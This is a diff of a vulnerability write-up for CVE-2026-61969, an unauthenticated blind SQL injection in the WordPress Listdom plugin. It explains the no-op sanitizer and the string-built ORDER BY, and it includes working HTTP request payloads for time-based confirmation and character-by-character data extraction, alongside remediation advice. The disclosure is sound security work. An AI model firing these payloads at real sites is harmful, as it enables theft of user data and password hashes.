@@ -5,88 +5,97 @@ draft: false
 aliases:
   - /posts/listdom-sqli/
   - /posts/blog/cve-2026-61969/
-description: "CVE-2026-61969: unauthenticated time-based blind SQL injection in the WordPress Listdom plugin through 5.6.0, via a sort parameter and a sanitizer that does nothing."
-summary: "Unauthenticated blind SQLi in Listdom <= 5.6.0 through a no-op sanitizer and a string-built ORDER BY. Now assigned CVE-2026-61969."
+description: "CVE-2026-61969: unauthenticated SQL injection in the WordPress Listdom plugin through 5.6.0 via the meta_type sort parameter."
+summary: "Unauthenticated SQL injection in Listdom <= 5.6.0 via the meta_type sort parameter. Assigned CVE-2026-61969."
 technologies: ["wordpress", "listdom", "php", "mariadb"]
 vulnerabilities: ["sqli"]
 ---
 
 # A Sanitizer That Sanitizes Nothing
 
-**CVE-2026-61969** is out. Listdom is a business-directory and listings plugin, and it has one of my favourite kinds of bug: the code that was supposed to make it safe runs, looks reassuring in the diff, and does absolutely nothing. An unauthenticated visitor can read the whole database out of it, one character at a time, through a sort parameter.
-
-Two things had to go wrong for this, and both of them did.
+**CVE-2026-61969**
 
 ## At a glance
 
 | Field | Value |
 |---|---|
 | CVE | [CVE-2026-61969](https://www.cve.org/CVERecord?id=CVE-2026-61969) |
-| Software | Listdom (Business Directory & Listings) |
+| Software type | Plugin |
+| Software name | Listdom (Business Directory & Listings) |
 | Slug | [`listdom`](https://wordpress.org/plugins/listdom/) |
-| Affected | `<= 5.6.0` |
+| Affected version | `<= 5.6.0` (latest at time of testing) |
 | Fixed | `5.7.0` |
-| Type | Unauthenticated SQL Injection (CWE-89) |
-| CVSS | 9.3 Critical |
-| Privilege | None |
+| Vulnerability type | CWE-89 (SQL Injection) |
+| CVSS | **9.3, Critical** · `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L` |
+| Required privilege | None (unauthenticated) |
 
-## Wrong thing number one: the no-op sanitizer
+## Required privilege
 
-Listdom registers a pile of front-end AJAX actions for logged-out users. No nonce required. Things like `lsd_grid_load_more`, `lsd_grid_sort`, `lsd_listgrid_load_more`, `lsd_listgrid_sort`, and `lsd_ajax_search` all flow into the same query builder, fed from the attacker-supplied `atts` array:
+None. The endpoints are registered for unauthenticated visitors (`wp_ajax_nopriv_*`) and require no nonce.
 
+## Description
+
+Listdom registers several front-end AJAX actions for unauthenticated users, including `lsd_grid_load_more`, `lsd_grid_sort`, `lsd_listgrid_load_more`, `lsd_listgrid_sort`, and `lsd_ajax_search`. These actions are handled by `LSD_Skins::filter()` (and `LSD_Ajax::search()`), which build a listings query from the attacker-supplied `atts` array.
+
+`app/includes/skins/grid.php`
 ```php
-// app/includes/skins/grid.php
-add_action( 'wp_ajax_nopriv_lsd_grid_load_more', array( $this, 'filter' ) );
-add_action( 'wp_ajax_nopriv_lsd_grid_sort',      array( $this, 'filter' ) );
+add_action( 'wp_ajax_lsd_grid_load_more',        array( $this, 'filter' ) );
+add_action( 'wp_ajax_nopriv_lsd_grid_load_more', array( $this, 'filter' ) );  // unauthenticated
+add_action( 'wp_ajax_lsd_grid_sort',             array( $this, 'filter' ) );
+add_action( 'wp_ajax_nopriv_lsd_grid_sort',      array( $this, 'filter' ) );  // unauthenticated
 ```
 
-Inside `filter()`, there's a line that looks like it cleans the incoming attributes:
+The sort configuration is taken directly from request input. In `LSD_Skins::sort()`:
 
+`app/includes/skins.php`
 ```php
-$atts = $_POST['atts'] ?? [];
-array_walk_recursive($atts, 'sanitize_text_field'); // does nothing useful
-```
-
-Except `array_walk_recursive` passes values *by value*. `sanitize_text_field` returns a cleaned copy, that copy is thrown on the floor, and `$atts` marches on untouched. It's a sanitizer-shaped decoration. The real value flows straight through.
-
-## Wrong thing number two: string-built ORDER BY
-
-The sort config comes right out of that request data, in `LSD_Skins::sort()`:
-
-```php
-// app/includes/skins.php
+$this->sorts = $this->atts['lsd_sorts'] ?? LSD_Options::defaults('sorts');
+// ...
 $this->sort_meta_type = isset($option['meta_type']) && trim($option['meta_type'])
     ? $option['meta_type'] : null;   // attacker-controlled
 ```
 
-and `meta_type` gets concatenated into an `ORDER BY` through a `posts_clauses` filter, which sidesteps WordPress core's orderby allow-list entirely:
+The intended sanitizer in `filter()` is a no-op, because `array_walk_recursive` passes values by value and the sanitized copies are discarded:
 
 ```php
-$sanitized_type = strtoupper(preg_replace('/[^A-Z0-9_(), ]/', '', $meta_type));
-$value_expression = "CAST($alias.meta_value AS $sanitized_type)"; // straight concatenation
-$clauses['orderby'] = /* ... */ . $value_expression . /* ... */;
+$atts = $_POST['atts'] ?? [];
+array_walk_recursive($atts, 'sanitize_text_field'); // result is thrown away; $atts is used as-is
 ```
 
-There's a regex here, and at a glance it looks protective. Look again at what it *keeps*: letters, digits, underscore, parentheses, comma, space. That's everything I need to break out of `CAST(... AS ...)` and bolt on functions like `SLEEP()`, `IF()`, `CASE`, `SUBSTRING()`, `ASCII()`. No quotes, no comparison operators required, because `IN (...)` does the comparisons against integers for me.
+The unsanitized `meta_type` then reaches a raw `ORDER BY` clause through a `posts_clauses` filter, which bypasses WordPress core's `WP_Query::parse_orderby()` allow-list entirely:
 
-## Proof of concept
+```php
+public function apply_sort_meta_clauses(array $clauses, WP_Query $wp_query): array {
+    // ...
+    $meta_type = $this->sort_meta_type;
+    // ...
+    $sanitized_type = strtoupper(preg_replace('/[^A-Z0-9_(), ]/', '', $meta_type));
+    // ...
+    $value_expression = "CAST($alias.meta_value AS $sanitized_type)"; // direct concatenation
+    // ...
+    $clauses['orderby'] = /* ... */ . $value_expression . /* ... */;
+    return $clauses;
+}
+```
 
-Site needs one published Listdom listing so the `ORDER BY` actually evaluates against a row. No auth, no cookies, no nonce.
+The character filter still permits letters, digits, `_`, `(`, `)`, `,`, and space. That is enough to break out of the `CAST(... AS ...)` expression and append arbitrary SQL functions such as `SLEEP()`, `IF()`, `CASE`, `SUBSTRING()`, and `ASCII()`, enabling time-based blind SQL injection and char-by-char data extraction. No string literals or comparison operators are needed, because `IN (...)` performs comparisons against integer values.
 
-Confirm it with a time delay:
+## Proof of Concept
 
+Prerequisite: a published Listdom listing exists on the site (the normal state of any live directory), so the `ORDER BY` clause is evaluated against at least one row. No authentication, cookies, or nonce are required.
+
+**Step 1. Confirm the injection (time-based):**
 ```http
 POST /wp-admin/admin-ajax.php HTTP/1.1
-Host: target
+Host: TARGET
 Content-Type: application/x-www-form-urlencoded
 
 action=lsd_grid_load_more&atts[lsd_sorts][default][orderby]=lsd_x&atts[lsd_sorts][options][lsd_x][meta_type]=DECIMAL)%20END,%20CASE%20WHEN%20SLEEP(5)%20THEN%201%20ELSE%20(1
 ```
 
-That `meta_type` decodes to `DECIMAL) END, CASE WHEN SLEEP(5) THEN 1 ELSE (1`, and the server takes about five seconds to answer. `SLEEP(0)` returns instantly, and the delay tracks the argument linearly. That's server-side SQL running.
+The `meta_type` value decodes to `DECIMAL) END, CASE WHEN SLEEP(5) THEN 1 ELSE (1`. The server takes about 5 seconds to respond, a `SLEEP(0)` control responds immediately, and response time tracks the `SLEEP` argument linearly (2s, 4s, 6s).
 
-What the database log actually saw:
-
+Captured query (from the DB log):
 ```sql
 ... ORDER BY CASE WHEN lsd_sort_meta.meta_value IS NULL OR lsd_sort_meta.meta_value = ''
         THEN 1 ELSE 0 END ASC,
@@ -96,32 +105,34 @@ What the database log actually saw:
     wp_posts.post_date DESC, wp_posts.ID DESC LIMIT 0, 12
 ```
 
-From there it's boolean extraction. This delays only if the first character of the DB version is the digit `1`:
-
+**Step 2. Extract database content (blind):**
 ```
 meta_type = DECIMAL) END, CASE WHEN IF(ASCII(SUBSTRING(VERSION(),1,1)) IN (49),SLEEP(4),SLEEP(0)) THEN 1 ELSE (1
 ```
 
-`IN (49)` matched and took ~4s, `IN (48)` returned immediately. Walk the offsets and candidate ASCII codes and you read `VERSION()`, `DATABASE()`, `USER()`, subqueries, `INFORMATION_SCHEMA`, and on case-insensitive deployments (Windows, macOS, or MySQL with `lower_case_table_names=1`, which is a lot of managed hosting) the user table and its password hashes.
+Observed against MariaDB 10.6: `IN (49)` (matches `1`) takes about 4 seconds (TRUE); `IN (48)` is immediate (FALSE). Iterating offset and candidate ASCII codes reads arbitrary SQL expressions (`VERSION()`, `DATABASE()`, `USER()`, subqueries). `INFORMATION_SCHEMA` is reachable on all deployments; on case-insensitive deployments the same technique extracts user table data such as password hashes.
 
-## Why it matters
+## Impact
 
-No account, no interaction, and an attacker reads arbitrary data out of the WordPress database through blind extraction: user records, password hashes, secrets. Same primitive gives you a denial-of-service knob with heavy `SLEEP` expressions. Unauthenticated SQLi on a directory plugin is a bad afternoon for a lot of sites.
+An unauthenticated attacker can execute arbitrary SQL read queries against the WordPress database and exfiltrate its contents (user records, password hashes, secrets) via blind extraction, and can cause denial of service with `SLEEP`/heavy expressions. No account and no user interaction.
 
-## The fix
+## Suggested remediation
 
-Don't interpolate `meta_type`, or any request value, into SQL. Validate it against a fixed allow-list of cast types (`CHAR`, `DECIMAL`, `SIGNED`, `UNSIGNED`, `DATE`, `DATETIME`, `TIME`) and reject the rest. Stop building `ORDER BY` from a raw `posts_clauses` string. And if you're going to keep that `array_walk_recursive` line, assign the result back so it actually does something, though that's defense in depth, not the fix.
+1. Do not interpolate `meta_type` (or any request value) into SQL. Validate it against a fixed allow-list of SQL cast types (`CHAR`, `DECIMAL`, `SIGNED`, `UNSIGNED`, `DATE`, `DATETIME`, `TIME`) and reject anything else.
+2. Avoid building `ORDER BY` through a raw `posts_clauses` string. Where a custom order is required, use parameterized fragments and a strict allow-list of column/meta keys.
+3. Fix the no-op sanitizer in `filter()` (assign the result back). Defense in depth, not a substitute for item 1.
 
-Update to **5.7.0 or later**.
+Update Listdom to **5.7.0 or later**.
 
-## Disclosure
+## Discovery
 
-Found during independent research against a fresh install (WordPress 6.6 / PHP 8.2 / MariaDB 10.6 / Listdom 5.6.0) in a Docker lab. Reported through Patchstack.
+Independent security research. A self-contained reproduction (Dockerized WordPress 6.6 / PHP 8.2 / MariaDB 10.6 with Listdom 5.6.0) and request/response timing evidence are retained by the reporter and available on request.
+
+Reported through the Patchstack Bug Bounty Program.
 
 - Reported: 29 Jun 2026
 - Fixed: 5.7.0
-- Published: 13 Aug 2026
+- CVE published: 13 Aug 2026
+- Writeup published: 18 Sep 2026
 - CVE: [CVE-2026-61969](https://www.cve.org/CVERecord?id=CVE-2026-61969)
 - Advisory: [Patchstack](https://patchstack.com/database/wordpress/plugin/listdom/vulnerability/wordpress-listdom-plugin-5-6-0-sql-injection-vulnerability?_s_id=cve)
-
-*A sanitizer you don't test is just a comment that runs.*
